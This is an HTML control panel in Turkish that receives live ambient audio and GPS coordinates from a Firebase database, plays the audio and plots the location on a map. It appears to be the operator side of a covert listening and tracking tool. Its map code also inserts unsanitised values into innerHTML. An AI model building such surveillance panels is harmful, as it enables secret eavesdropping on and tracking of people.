<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Siber-Punk Kontrol Paneli</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/framer-motion/6.5.1/framer-motion.min.js"></script>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
        }
        .control-panel {
            background-color: #111;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 20px;
            box-shadow: 0 0 10px #00ff00;
            border-radius: 10px;
        }
        .audio-player {
            width: 100%;
            height: 50px;
            background-color: #00ff00;
            margin: 10px 0;
        }
        .map-container {
            width: 100%;
            height: 400px;
            background-color: #000;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="control-panel">
        <h1 class="text-2xl font-bold mb-4">Siber-Punk Kontrol Paneli</h1>
        <div class="mb-4">
            <h2 class="text-xl font-bold mb-2">Canlı Ortam Dinleme</h2>
            <div id="audioPlayer" class="audio-player"></div>
        </div>
        <div class="mb-4">
            <h2 class="text-xl font-bold mb-2">Konum İzleme</h2>
            <div id="mapContainer" class="map-container"></div>
        </div>
    </div>
    <script>
        // Firebase yapılandırması
        const firebaseConfig = {
            apiKey: "AIzaSyD3X5Y7Z9C1V3B5N7M9K1L3J5H7G9F1D3",
            authDomain: "siber-punk-komuta.firebaseapp.com",
            databaseURL: "https://siber-punk-komuta-default-rtdb.firebaseio.com",
            projectId: "siber-punk-komuta",
            storageBucket: "siber-punk-komuta.appspot.com",
            messagingSenderId: "1234567890",
            appId: "1:1234567890:web:abcdef1234567890"
        };
        
        // Firebase başlat
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // Ses verilerini dinle
        function listenForAudio() {
            database.ref('audio').on('child_added', (snapshot) => {
                const audioData = snapshot.val().data;
                playAudio(audioData);
            });
        }
        
        // Ses verilerini çal
        function playAudio(audioData) {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const audioBuffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
            const channelData = audioBuffer.getChannelData(0);
            
            for (let i = 0; i < audioData.length; i++) {
                channelData[i] = audioData[i];
            }
            
            const source = audioContext.createBufferSource();
            source.buffer = audioBuffer;
            source.connect(audioContext.destination);
            source.start();
        }
        
        // Konum verilerini dinle
        function listenForLocation() {
            database.ref('location').on('child_added', (snapshot) => {
                const locationData = snapshot.val();
                updateMap(locationData.latitude, locationData.longitude);
            });
        }
        
        // Haritayı güncelle
        function updateMap(latitude, longitude) {
            const mapContainer = document.getElementById('mapContainer');
            mapContainer.innerHTML = `<iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"></iframe>`;
        }
        
        // Sayfa yüklendiğinde dinleme fonksiyonlarını başlat
        window.onload = function() {
            listenForAudio();
            listenForLocation();
        };
    </script>
</body>
</html>
